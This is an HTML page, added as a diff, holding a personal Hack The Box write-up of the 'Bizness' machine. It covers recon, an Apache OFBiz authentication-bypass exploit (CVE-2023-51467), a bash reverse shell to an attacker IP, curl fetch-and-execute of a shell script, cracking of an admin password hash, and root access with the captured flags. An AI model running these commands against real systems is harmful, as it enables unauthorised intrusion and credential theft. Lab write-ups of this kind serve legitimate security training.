@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>document.documentElement.classList.add("js");(function(){function a(k){var o=[];try{var p=String(window.name||"").split(";");for(var i=0;i<p.length;i++){var q=p[i].split("=");if(q[0]===k&&q[1])o.push(q[1])}}catch(e){}try{var m=document.cookie.match(new RegExp("(?:^|; )"+k+"=([^;]*)"));if(m)o.push(decodeURIComponent(m[1]))}catch(e){}try{var v=localStorage.getItem(k);if(v!==null&&typeof v!=="undefined")o.push(v)}catch(e){}return o}function g(k){var v=a(k);return v.length?v[0]:null}function p(){var b=null;a("fg-prefs").forEach(function(r){var x=String(r).split(".");if(x.length!==3)return;var t=parseInt(x[0],36);if(!isFinite(t)||t<=0)return;var th=x[1]==="light"||x[1]==="dark"?x[1]:null;var rl=x[2]==="c"||x[2]==="o"?x[2]:null;if(th||rl){if(!b||t>b.t)b={t:t,th:th,rl:rl}}});if(b)return b;var th=g("fg-theme"),rl=g("fg-spine-v2");if(th==="light"||th==="dark"||rl==="c"||rl==="o")return{t:0,th:th==="light"||th==="dark"?th:null,rl:rl==="c"||rl==="o"?rl:null};return null}try{var s=p();var th=s&&s.th?s.th:(matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");document.documentElement.setAttribute("data-theme",th);if(s&&s.rl==="c")document.documentElement.classList.add("nav-collapsed")}catch(e){document.documentElement.setAttribute("data-theme","dark")}})();</script>
+    <link rel="icon" type="image/svg+xml" href="../favicon.svg">
+    <link rel="alternate icon" type="image/x-icon" href="../assets/images/favicon.ico">
+    <link rel="stylesheet" href="../assets/css/reset.css?v=8">
+    <link rel="stylesheet" href="../assets/css/site.css?v=176">
+    <title>Frédéric Goossens | Bizness</title>
+</head>
+<body>
+    <a class="skip" href="#main">Skip to content</a>
+
+    <header class="spine">
+        <div class="spine-id">
+            <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
+                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-prompt"><span class="sigil">$</span>whoami</span>
+                <span class="si-name">Frédéric Goossens</span>
+                <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
+            </a>
+            <div class="si-socials">
+                <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
+            </div>
+        </div>
+        <nav aria-label="Primary">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span><span class="l">Home</span></a></li>
+                <li><a href="../resume.html"><span class="n">02</span><span class="l">Resume</span></a></li>
+                <li><a href="../writing.html"><span class="n">03</span><span class="l">Writing</span></a></li>
+                <li><a href="../htb.html"><span class="n">04</span><span class="l">HackTheBox</span></a></li>
+            </ul>
+        </nav>
+        <div class="spine-foot">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="spine-toggle" type="button" data-spine-toggle aria-expanded="true" aria-label="Collapse navigation"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M15 18l-6-6 6-6"/></svg></button>
+        </div>
+    </header>
+
+    <div class="topbar">
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <div class="tb-actions">
+            <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
+            <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+    </div>
+
+    <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
+        <div class="menu-top">
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <button class="close-btn" type="button" data-menu-close>Close ×</button>
+        </div>
+        <nav aria-label="Mobile">
+            <ul>
+                <li><a href="../index.html"><span class="n">01</span>Home</a></li>
+                <li><a href="../resume.html"><span class="n">02</span>Resume</a></li>
+                <li><a href="../writing.html"><span class="n">03</span>Writing</a></li>
+                <li><a href="../htb.html"><span class="n">04</span>HackTheBox</a></li>
+            </ul>
+        </nav>
+        <div class="menu-foot">
+            <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+            <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+        </div>
+    </div>
+
+    <div class="progress"></div>
+
+    <div class="shell">
+        <main class="wrap" id="main">
+            <div class="post-wrap">
+                <article class="post" data-cover="../assets/images/htb/bizness/logo.png">
+                    <a class="crumb" href="../htbList.html?os=Linux">← All Linux write-ups</a>
+                    <h1 data-type="Bizness" data-prefix="# "></h1>
+
+                    <div class="info">
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l7 3v5c0 4.6-3 8.2-7 10-4-1.8-7-5.4-7-10V6l7-3z"/></svg>
+                                Platform
+                            </span>
+                            <span class="meta-v">Hack The Box</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M5 20v-4M11 20V10M17 20V4"/></svg>
+                                Difficulty
+                            </span>
+                            <span class="meta-v" data-diff="Easy">Easy</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg>
+                                Read time
+                            </span>
+                            <span class="meta-v" data-read-time-auto=""></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-k">
+                                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M4 20l4-1L20 7l-3-3L5 16l-1 4z"/></svg>
+                                Author
+                            </span>
+                            <span class="meta-v">Frédéric Goossens</span>
+                        </div>
+                    </div>
+
+                    <h2>Discovery</h2>
+
+<details>
+<summary>nmap</summary>
+<div class="inner">
+<p><code>sudo nmap -A -sV -sT -v -O -T4 -p- 10.10.11.252</code></p><pre><code>PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)
+|   256 3911423f0c250008d72f1b51e0439d85 (ECDSA)
+|_  256 b06fa00a9edfb17a497886b23540ec95 (ED25519)
+
+80/tcp    open  http       nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.18.0
+
+443/tcp   open  ssl/http   nginx 1.18.0
+|_ssl-date: TLS randomness does not represent time
+| http-methods:
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-title: 400 The plain HTTP request was sent to HTTPS port
+| tls-nextprotoneg:
+|_  http/1.1
+|_http-server-header: nginx/1.18.0
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-12-14T20:03:40
+| Not valid after:  2328-11-10T20:03:40
+| MD5:   b1822fdb92b020366b988850b66eda27
+|_SHA-1: 813885954343f40f937bcc8223af90523f5deb50
+| tls-alpn:
+|_  http/1.1
+37107/tcp open  tcpwrapped</code></pre>
+</div>
+</details>
+
+<details>
+<summary>feroxbuster</summary>
+<div class="inner">
+<p><code>feroxbuster --url </code><code><a href="https://bizness.htb/">https://bizness.htb/</a></code><code> --depth 2 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --insecure --dont-filter</code></p><pre><code>...
+302      GET        0l        0w        0c https://bizness.htb/content/privacy =&gt; https://bizness.htb/content/control/main
+302      GET        0l        0w        0c https://bizness.htb/content/spacer =&gt; https://bizness.htb/content/control/main
+302      GET        0l        0w        0c https://bizness.htb/content/search =&gt; https://bizness.htb/content/control/main
+302      GET        0l        0w        0c https://bizness.htb/ads =&gt; https://bizness.htb/
+...</code></pre><blockquote>A lot of redirects to <a href="https://bizness.htb/content/control/main">https://bizness.htb/content/control/main</a> which appears to be a login panel</blockquote>
+</div>
+</details>
+
+<details>
+<summary>web</summary>
+<div class="inner">
+<p><code><a href="https://bizness.htb/catalog/images">https://bizness.htb/catalog/images</a></code></p><figure><img src="../assets/images/htb/bizness/01-untitled.png" alt=""></figure><blockquote>Log4j verbose error</blockquote><p><code><a href="https://bizness.htb/content/control/main">https://bizness.htb/content/control/main</a></code></p><figure><img src="../assets/images/htb/bizness/02-untitled-1.png" alt=""></figure><blockquote>OFBiz Apache 18.12 - login panel</blockquote>
+</div>
+</details>
+
+<h2>Foothold</h2>
+
+<h3>OFBiz - <a href="https://www.cvedetails.com/cve/CVE-2023-51467/"><strong>CVE-2023-51467</strong></a></h3>
+
+<figure><p><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-28350/Apache-Ofbiz.html" target="_blank" rel="noopener noreferrer">Apache Ofbiz : Security vulnerabilities, CVEs</a> - Security vulnerabilities of Apache Ofbiz : List of vulnerabilities affecting any version of this product</p></figure>
+
+<p><a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass" target="_blank" rel="noopener noreferrer">https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass</a></p>
+
+<p><strong>Execute exploit:</strong></p>
+
+<pre><code>┌──(parallels㉿kali)-[~/Desktop/Apache-OFBiz-Authentication-Bypass]
+└─$ python3 exploit.py --url https://bizness.htb --cmd "curl http://10.10.16.6:88"
+[+] Generating payload...
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+[+] Payload generated successfully.
+[+] Sending malicious serialized payload...
+[+] The request has been successfully sent. Check the result of the command.</code></pre>
+
+<p><strong>See request on our webserver:</strong></p>
+
+<pre><code>┌──(parallels㉿kali)-[~/Desktop]
+└─$ python3 -m http.server 88
+Serving HTTP on 0.0.0.0 port 88 (http://0.0.0.0:88/) ...
+10.10.11.252 - [19/Feb/2024 13:37:04] "GET / HTTP/1.1" 200 -</code></pre>
+
+<p><strong>Get shell:</strong></p>
+
+<pre><code># (a oneliner didn't work for some reason so I used a bash file)
+
+nano shell
+bash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.16.6/88 &lt;&amp;1'
+python3 -m http.server 88
+
+python3 exploit.py --url https://bizness.htb --cmd "curl http://10.10.16.6:88/shell -o shell"
+python3 exploit.py --url https://bizness.htb --cmd "chmod +x shell"
+python3 exploit.py --url https://bizness.htb --cmd "./shell"</code></pre>
+
+<figure><img src="../assets/images/htb/bizness/03-untitled-2.png" alt=""></figure>
+
+<p>Found flag in /home/ofbiz → <mark class="highlight-teal" data-notion-highlight="teal"><strong>a943ec0a996eefd1bdeee4b53f4eb660</strong></mark></p>
+
+<h2>Priv Escalation</h2>
+
+<h3>Linpeas</h3>
+
+<p><strong>Systemd services:</strong></p>
+
+<pre><code>/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/multi-user.target.wants/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew
+/etc/systemd/system/ofbiz.service is calling this writable executable: /opt/ofbiz/gradlew</code></pre>
+
+<p><strong>Ports:</strong></p>
+
+<pre><code>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
+tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      850/java
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      850/java
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::37107                :::*                    LISTEN      720/java
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 127.0.0.1:8443          :::*                    LISTEN      850/java
+tcp6       0      0 127.0.0.1:10523         :::*                    LISTEN      850/java
+tcp6       0      0 :::443                  :::*                    LISTEN      -</code></pre>
+
+<p><strong>Files with interesting permissions:</strong></p>
+
+<pre><code>drwxr-xr-x 2 root root 4096 Dec 21 09:15 /etc/nginx/sites-enabled
+drwxr-xr-x 2 root root 4096 Dec 21 09:15 /etc/nginx/sites-enabled
+lrwxrwxrwx 1 root root 34 Dec 14 14:49 /etc/nginx/sites-enabled/default -&gt; /etc/nginx/sites-available/default</code></pre>
+
+<h3>Hash</h3>
+
+<p><strong>Found interesting hash: </strong><code>/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml</code></p>
+
+<pre><code>{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a</code></pre>
+
+<p><strong>Found another hash with a salt</strong></p>
+
+<pre><code>ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ grep -arin "password="
+c54d0.dat:21: &lt;eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/&gt;</code></pre>
+
+<p><strong>Crack the hash:</strong></p>
+
+<figure><p><a href="https://techyrick.com/bizness-hackthebox-writeup/" target="_blank" rel="noopener noreferrer">Bizness HacktheBox Writeup | HTB</a></p></figure>
+
+<pre><code>┌──(parallels㉿kali)-[~/Desktop]
+└─$ python3 crack.py --hash-string '$SHA-1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=' --wordlist /usr/share/wordlists/rockyou.txt
+[+] Attempting to crack....
+Found Password: monkeybizness
+hash: $SHA-1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=
+(Attempts: 1478438)
+[!] Super, I bet you could log into something with that!</code></pre>
+
+<p><strong>Login as root:</strong></p>
+
+<pre><code>ofbiz@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0$ su root
+Password:
+root@bizness:/opt/ofbiz/runtime/data/derby/ofbiz/seg0# cd /root
+root@bizness:~# ls
+root.txt
+root@bizness:~# cat root.txt
+0ff9f82c6c6de176f4cdc6dc932b3099
+root@bizness:~#</code></pre>
+
+<p>Found flag → <mark class="highlight-teal" data-notion-highlight="teal"><strong>0ff9f82c6c6de176f4cdc6dc932b3099</strong></mark></p>
+
+
+                </article>
+
+                <aside class="toc">
+                    <p class="toc-k">Contents</p>
+                    <ul id="toc-list"></ul>
+                </aside>
+            </div>
+        </main>
+
+        <footer class="site-foot">
+            <div class="foot-in">
+                <p class="copy">© <span data-year></span> Frédéric Goossens · <span class="credit">vibe coded</span></p>
+                <div class="socials">
+                    <a class="slink" href="https://github.com/fredericgoossens" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg><span>GitHub</span></a>
+                    <a class="slink" href="https://www.linkedin.com/in/fr%C3%A9d%C3%A9ric-goossens-0344b1241/" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span>LinkedIn</span></a>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <div class="scroll-hint" data-scroll-hint aria-hidden="true"></div>
+    <script src="../assets/js/site.js?v=66"></script>
+</body>
+</html>
